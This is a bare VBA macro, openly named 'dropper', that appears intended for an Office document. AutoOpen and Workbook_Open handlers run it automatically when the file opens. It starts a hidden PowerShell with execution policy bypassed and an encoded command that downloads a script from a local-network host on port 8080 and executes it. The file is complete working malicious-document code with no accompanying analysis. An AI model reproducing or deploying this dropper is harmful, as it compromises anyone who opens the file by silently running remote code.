Sub dropper()
'
' dropper Macro
'
'
Dim exec: exec = ""
exec = exec & "powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -enc aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAvAG0AYQBpAG4ALgBwAHMAMQAnACkA"
Shell (exec)
End Sub
Sub AutoOpen()
dropper
End Sub
Sub Workbook_Open()
dropper
End Sub
